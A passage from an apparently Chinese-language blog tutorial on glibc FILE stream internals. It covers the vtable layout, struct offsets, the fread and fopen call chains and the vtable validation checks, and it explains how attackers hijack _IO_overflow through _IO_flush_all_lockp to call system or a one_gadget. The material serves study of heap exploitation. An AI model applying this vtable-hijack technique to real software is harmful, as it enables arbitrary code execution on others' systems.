class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure><p>这里补充一个点，所有进程启动都会自动创建stdin、stdout、stderr三个FILE结构，存在libc.so的数据段中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br></pre></td></tr></table></figure><p>其他通过fopen等函数创建出来的FILE结构一般会被分配到堆中储存，而这些函数的返回值通常就是指向该FILE结构的指针。</p><h5 id="IO-jump-t-vtable"><a href="#IO-jump-t-vtable" class="headerlink" title="_IO_jump_t *vtable"></a>_IO_jump_t *vtable</h5><p><code>vtable</code>就是我们常说的虚表，他是一个重要的指针，指向一系列IO相关的函数指针。常规文件流的vtable类型为<code>_IO_jump_t</code>,定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在libc中定义的vtable有<code>_IO_file_jumps</code>, <code>_IO_str_jumps</code>, <code>_IO_cookie_jumps</code>等。</p><p>FILE头和vtable的偏移在64位下一般是xd8大小，整个<code>_IO_FILE_plus</code>结构体内部偏移如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><h3 id="常用IO函数调用链分析"><a href="#常用IO函数调用链分析" class="headerlink" title="常用IO函数调用链分析"></a>常用IO函数调用链分析</h3><h5 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h5><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">(<span class="type">void</span> *__restrict __ptr, <span class="type">size_t</span> __size,<span class="type">size_t</span> __n, FILE *__restrict __stream)</span>;</span><br></pre></td></tr></table></figure><p>又有宏定义<code>#define fread(p, m, n, s) _IO_fread (p, m, n, s)</code>。于是我们追踪<code>_IO_fread</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_sgetn</code>函数（在genops.c中）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_XSGETN</code>就是vtable中的函数指针之一，默认指向<code>_IO_file_xsgetn</code>。</p><h5 id="其他常见函数对应指针总结"><a href="#其他常见函数对应指针总结" class="headerlink" title="其他常见函数对应指针总结"></a>其他常见函数对应指针总结</h5><ul><li>printf&#x2F;puts -&gt;<code>_IO_XSPUTN</code>-&gt;_<code>IO_OVERFLOW</code></li><li>scanf&#x2F;gets -&gt; <code>_IO_XSGETN</code></li><li>fwrite -&gt; <code>_IO_XSPUTN</code>-&gt;<code>_IO_OVERFLOW</code></li><li>fread -&gt; <code>_IO_XSGETN</code></li><li>fclose -&gt; <code>_IO_FINISH</code></li><li>exit -&gt; <code>_IO_flush_all_lockp</code> -&gt;<code>_IO_OVERFLOW</code></li></ul><p>顺带一提，当我们用printf输出一个以换行符结尾的纯字符串的时候，printf会被优化成puts函数并去除换行符。</p><h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h5><p>我们顺便关注一下一个文件流被创建的过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#   <span class="keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数被稍微封装了一下，回归到<code>__fopen_internal</code>函数。函数malloc了一块地址用来存放FILE，由此可知一般文件流的FILE是被放在堆上的。</p><p>接着用<code>_IO_no_init</code>函数和<code>_IO_JUMPS</code>初始化了vtable：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS(THIS) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure><p>然后初始化FILE结构本身，将新的FILE链入链表中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后调用系统调用打开文件，就算完成了一次fopen。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>每一个FILE结构中的vtable指针指向同一个位置，通常会将<code>_IO_overflow_t</code>改为system(参数写在flags位上)或onegadget地址完成利用。</p><h5 id="IO-flush-all-lockp"><a href="#IO-flush-all-lockp" class="headerlink" title="_IO_flush_all_lockp"></a>_IO_flush_all_lockp</h5><p>调用<code>_IO_flush_all_lockp</code>时，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的_IO_overflow。</p><p>我们重点关注这个函数及相关调用是因为攻击者常常利用这个函数来进行一系列的攻击操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li>当 libc 执行 abort 流程时（2.26开始被删除）</li><li>当执行 exit 函数时</li><li>当执行流从 main 函数返回时</li></ol><p>且为了使<code>_IO_flush_all_lockp</code>能正常工作，我们要满足调用<code>_IO_OVERFLOW</code>的其他条件，即</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code></li></ul><p>由此构造<code>_IO_FILE_plus</code>和vtable的<code>_IO_OVERFLOW</code>（位于0x18偏移处）</p><h5 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h5><p>2.23版本中对vtable没有检查，可以在可控地址上伪造虚表后，再劫持原本的vtable指针为伪造的虚表。</p><h5 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h5><p>2.24中新增了对vtable指针的检测，检查该地址是否合法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IO_validate_vtable (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  